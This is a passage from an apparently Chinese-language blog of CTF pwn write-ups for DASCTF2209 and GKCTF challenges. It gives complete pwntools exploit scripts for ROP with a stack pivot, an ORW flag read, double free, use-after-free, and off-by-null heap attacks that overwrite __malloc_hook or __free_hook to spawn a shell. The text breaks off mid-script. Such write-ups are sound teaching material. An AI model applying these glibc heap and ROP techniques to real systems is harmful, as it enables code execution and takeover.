<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">...</span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span></span><br></pre></td></tr></table></figure>

<p>而__libc_atexit是exit里存在函数指针，不详细记录了，具体逻辑可以在IDA里查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN_HOOK (__libc_atexit, ());</span><br></pre></td></tr></table></figure>

<p><img src="https://files.catbox.moe/wue001.png" alt="image-20221112164122442"></p>
<p>但是并没有成功，__libc_atexit甚至都没有改掉，这里挖坑先空着，之后回头解决。</p>
<h2 id="0x02-DASCTF2209-appetizer"><a href="#0x02-DASCTF2209-appetizer" class="headerlink" title="0x02 DASCTF2209 appetizer"></a>0x02 DASCTF2209 appetizer</h2><p>libc-2.31 程序开启沙盒和NX，首先通过构造栈帧绕过程序认证，再使用栈迁移加ROP使用ORW读出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line">sa(<span class="string">&quot;Let&#x27;s check your identity&quot;</span>,<span class="string">b&#x27;\x00\x00Nameless&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&quot;Here you are:0x&quot;</span>)</span><br><span class="line">end = <span class="built_in">int</span>(rl().strip(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">pie = end - <span class="number">0x4050</span></span><br><span class="line">read_plt = pie + elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = pie + elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = pie + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = pie + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = pie + <span class="number">0x00000000000014d3</span></span><br><span class="line">pop_rsi_r15 = pie + <span class="number">0x00000000000014d1</span></span><br><span class="line">ret = pie + <span class="number">0x000000000000101a</span></span><br><span class="line">leave_ret = pie + <span class="number">0x00000000000012d8</span></span><br><span class="line">info(<span class="built_in">hex</span>(end))</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">1</span>)+ p64(pop_rsi_r15) + \</span><br><span class="line">p64(puts_got) + p64(<span class="number">0</span>) + p64(write_plt) +p64(ret)*<span class="number">21</span> + p64(pie+<span class="number">0x1428</span>)+\</span><br><span class="line">p64(end-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += <span class="string">b&quot;flag.txt&quot;</span></span><br><span class="line">sa(<span class="string">&quot;information on it&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">sa(<span class="string">&quot;Tell me your wish:&quot;</span>,p64(end-<span class="number">8</span>) + p64(leave_ret))</span><br><span class="line">libc_base = l64() - <span class="number">0x84420</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">open_= libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi) + p64(end+<span class="number">0xf8</span>)+ p64(pop_rsi) + \</span><br><span class="line">p64(<span class="number">0</span>) + p64(open_)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>)+ p64(pop_rsi) + \</span><br><span class="line">p64(end+<span class="number">0x100</span>) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_plt)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>)+ p64(write_plt)</span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">&quot;ld1ng&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x03-DASCTF2209-bar"><a href="#0x03-DASCTF2209-bar" class="headerlink" title="0x03 DASCTF2209 bar"></a>0x03 DASCTF2209 bar</h2><p>libc-2.31 libc基址白给，漏洞在于drink函数没有对堆块的检查，导致double free和UAF(似乎没用)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !*(_QWORD *)<span class="built_in">list</span>[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;run off&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)<span class="built_in">list</span>[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先塞满tcache，加两个unsortedbin(合并)，再申请回一个tcache，bouble free后面的unsortedbin，这样unsortedbin块就进入了tcache，最后申请小块分割合并的大unsortedbin，使main_arena下移到tcache的fd指针。最后用drink函数修改main_arena为malloc_hook，getshell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">op,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;brandy or Vodka?&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line">    sa(<span class="string">&quot;to the waiter:&quot;</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx,num</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;How much?&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(rl().strip(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line">libc_base = leak() - <span class="number">0x1ed6a0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">info(<span class="built_in">hex</span>(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">ogg = one_gadget()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#10</span></span><br><span class="line">free(<span class="number">8</span>,<span class="number">0</span>) </span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#12</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,p64(ogg[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># gdb.attach(io</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&quot;test\n&quot;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="0x04-DASCTF2209-cgrasstring"><a href="#0x04-DASCTF2209-cgrasstring" class="headerlink" title="0x04 DASCTF2209 cgrasstring"></a>0x04 DASCTF2209 cgrasstring</h2><p>libc-2.27.so C++ STLstring类的resize很类似realloc，可以实现free功能。当resize是扩大当前string时，会delet掉原来的string，然后新建一个。</p>
<p>调试发现，同类大小堆块申请后tcache中会先放入一个同大小的堆块。先填满tcache，再free一个unsortedbin，由于存在UAF，所以直接打印main_arena，泄露出libc。由于内容resize机制，会将原内容cpy到新地址，而change的内容还是会写到旧堆块，所以之后修改tcache的fd为free_hook，将free_hook改为system，将idx8内容写为/bin/sh，当free（8）时，getshell。</p>
<p>ps:本地one_gadget测试一直不过，不清楚情况。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    change(i,<span class="number">0x90</span>,<span class="string">&#x27;\xe0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">7</span>,<span class="number">0x90</span>,<span class="string">&#x27;\xe0&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = l64() - <span class="number">0x3ebce0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment"># malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line">info(<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="comment"># ogg = one_gadget()</span></span><br><span class="line"><span class="comment"># print(list(map(hex,ogg)))</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">change(<span class="number">8</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,p64(system))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">getshell()</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="0x05-GKCTF-EscapeSH"><a href="#0x05-GKCTF-EscapeSH" class="headerlink" title="0x05 GKCTF EscapeSH"></a>0x05 GKCTF EscapeSH</h2><p>libc-2.23，题目是一个模拟shell程序，可以逆向分析过程，总的分为打印菜单，获取路径，输入命令和执行四步，漏洞点在输入命令时，为分割后的命令分配堆，strcpy存在的off by null漏洞，值得注意的是IDA中strlen()的C反编译代码形式如下。</p>
<p><img src="https://files.catbox.moe/uuzqxx.png" alt="image-20221110211242042"></p>
<p>另外在monitor命令中存在这样一个函数，dl_iterate_phdr((int (*)(struct dl_phdr_info *, size_t, void *))callback, “EscapeSh”)，发现里面存在后门函数。</p>
<p>dl_iterate_phdr() 允许程序迭代它已加载的共享对象。回调函数对每个加载的共享对象调用一次，允许对每个共享对象执行一个操作。 callback 使用三个参数调用： </p>
<ol>
<li>指向包含共享对象信息的dl_phdr_info类型结构的指针；</li>
<li>结构的整数大小；</li>
<li>以及dl_iterate_phdr()的data参数的副本。如果回调函数返回一个非零值， dl_iterate_phdr()将停止处理，即使有未处理的共享对象。处理顺序未指定。</li>
</ol>
<p>dl_phdr_info 结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dl_phdr_info</span> &#123;</span></span><br><span class="line">　　ElfW(Addr) dlpi_addr;       <span class="comment">/* 基地址 */</span></span><br><span class="line">　　<span class="keyword">const</span> <span class="keyword">char</span>* dlpi_name;      <span class="comment">/* 对象名 */</span></span><br><span class="line">　　<span class="function"><span class="keyword">const</span> <span class="title">Elf</span><span class="params">(Phdr)</span> *dlpi_phdr</span>; <span class="comment">/* 对象的elf头数组的指针*/</span></span><br><span class="line">　　ElfW(Half) dlpi_phnum;      <span class="comment">/* 头的数量 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>ElfW宏根据不同的硬件架构定义合适的elf数据类型,如32位平台就是Elf32_Addr.</li>
<li>ELF 共享对象包含一些数据段， 每个段都会有个程序头结构来描述这个段。</li>
</ul>
<p>Elf32_Phdr ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Elf32_Word p_type;</span><br><span class="line">Elf32_Off p_offset; <span class="comment">/* 段文件偏移 */</span></span><br><span class="line">Elf32_Addr p_vaddr;</span><br><span class="line">Elf32_Addr p_paddr;</span><br><span class="line">Elf32_Word p_filesz; <span class="comment">/* segment size in file*/</span></span><br><span class="line">Elf32_Word p_memsz; <span class="comment">/* 段在内存大小 */</span></span><br><span class="line">Elf32_Word p_flags; <span class="comment">/* 段标志 */</span></span><br><span class="line">Elf32_Word p_align; <span class="comment">/* 段对齐值*/</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure>

<p>其中需指出的是p_memsz大于或等于p_filesz, 这是因为，在内存中的段可能会存在.bass节， 由于这个放到磁盘会占用空间，所以在段加载到内存都会加上。</p>
<p>一个小demo</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;link.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">callback</span><span class="params">(struct dl_phdr_info *info , <span class="keyword">size_t</span> size, <span class="keyword">void</span>*data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;name: %s (%d segemts)\n&quot;</span>, info-&gt;dlpi_name, info-&gt;dlpi_phnum);</span><br><span class="line">    <span class="keyword">for</span>( j =<span class="number">0</span>; j&lt; info-&gt;dlpi_phnum; j++)&#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;\t\t header %2d: address = %10p\n&quot;</span>,j,</span><br><span class="line">        (<span class="keyword">void</span>*) (info-&gt;dlpi_addr + info-&gt;dlpi_phdr[j].p_vaddr));</span><br><span class="line">        <span class="comment">// Dl_info dlinfo;</span></span><br><span class="line">        <span class="comment">// dladdr((void*) (info-&gt;dlpi_addr + info-&gt;dlpi_phdr[j].p_vaddr), &amp;dlinfo);</span></span><br><span class="line">        <span class="comment">// printf(&quot;\t %s : %s\n&quot;, dlinfo.dli_fname, dlinfo.dli_sname);</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">dl_iterate_phdr(callback, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://files.catbox.moe/jcyog6.png" alt="image-20221110213502442"></p>
<p>所以可以通过dl_iterate_phdr 遍历程序当前加载的动态库，从而获取基地址，其中就包括libc。查看其偏移0x3c4b10可知为__malloc_hook，那么只要触发__malloc_hook的值为”monitor”即可执行后门函数。</p>
<p><img src="https://files.catbox.moe/gccnwa.png" alt="image-20221110212508037"></p>
<p>通过off by null 覆盖p位，构造堆块重叠，通过echo泄露libc基址，修改fd为mallochook附近，修改为”monitor”即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">*args</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> buf <span class="keyword">in</span> args:</span><br><span class="line">        payload += buf</span><br><span class="line">        payload += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    sl(payload)</span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xf0</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 前块为fastbin，p位不置0，因此需要设置presize和p位</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    cmd(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x68</span>-i))        <span class="comment"># prev_size</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">b&#x27;\x10\x01&#x27;</span>)</span><br><span class="line">cmd(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>)                <span class="comment"># Unlink合并大堆块</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>-<span class="number">1</span>),<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x30</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x30</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">cmd(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x9f</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    cmd(p8(<span class="number">0x71</span>)*(<span class="number">0x9f</span>-i))</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">b&quot;echo&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x5f</span>),<span class="string">b&quot;b&quot;</span>*(<span class="number">0x8f</span>)) <span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">malloc_hook = l64()-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="string">b&quot;a&quot;</span>*<span class="number">0xa7</span>)</span><br><span class="line">cmd(<span class="string">b&quot;a&quot;</span>*<span class="number">0xa6</span>) <span class="comment"># 将fd指针的高位置零</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa0</span>+p64(malloc_hook-<span class="number">0x23</span>)[:-<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    cmd(<span class="string">b&#x27;q&#x27;</span>*(<span class="number">0x9f</span>-i)) <span class="comment"># 布局重叠块</span></span><br><span class="line"></span><br><span class="line">s(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">cmd(<span class="string">b&#x27;monitor&#x27;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x60</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x13</span>+<span class="string">b&quot;monitor&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">0x45</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="0x06-GKCTF-demo-catRoom"><a href="#0x06-GKCTF-demo-catRoom" class="headerlink" title="0x06 GKCTF demo_catRoom"></a>0x06 GKCTF demo_catRoom</h2><p>一道模拟客户端服务器的题目，简单的堆溢出，问题出在复制账号密码时，客户端发送的内容最长为0x68，但是服务器端会将其复制到大小为0x48的缓冲区。利用这一点可以覆盖存放admin密码的heap，然后修改密码或者更改admin用户名，然后登录admin用户，打印flag即可。难点是审计和有耐心去审server端代码。</p>
<p><img src="https://files.catbox.moe/78nr17.png" alt="image-20230225215539074"></p>
<p>server端在刚开始的时候检测第一个用户有没有被注册，如果未注册，自动注册用户admin</p>
<p><img src="https://files.catbox.moe/7f7aqg.png" alt="image-20230225215744113"></p>
<p>内存结构如下，由于存在溢出，可以修改tcachebin链，链接到admin的chunk上，从而修改admin的密码；或者最简单的是直接修改自己的用户名为admin</p>
<p><img src="https://files.catbox.moe/ojtryl.png" alt="image-20230225215332153"></p>
<p>exp使用修改密码的方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">registe</span>(<span class="params">name,passwd</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;0 exit \n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;your name\n&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;passwd\n&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">name,passwd</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;0 exit \n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;name\n&quot;</span>,name)</span><br><span class="line">    sla(<span 